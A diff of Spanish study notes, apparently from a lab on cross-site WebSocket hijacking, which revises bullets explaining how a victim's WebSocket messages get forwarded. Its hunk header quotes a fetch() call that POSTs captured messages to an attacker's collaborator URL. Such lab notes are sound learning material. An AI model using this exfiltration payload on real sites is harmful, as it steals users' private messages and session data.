@@ -40,8 +40,9 @@ fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: e
         
 - **Reenvía esos mensajes a otro servidor**
     
-    - Cada mensaje recibido es automáticamente enviado (como una solicitud POST) a otra URL, generalmente bajo control del atacante o 
+    - Cada mensaje recibido es automáticamente enviado (como una solicitud POST) a otra URL, bajo control del atacante. en este caso el WebSocket que hemos creado 
 
 ![[Pasted image 20250729142914.png]]
 
+una vez realizado esto solo debemos esperar a que la victima haga clic en la solicitu
 ![[Pasted image 20250729142857.png]]
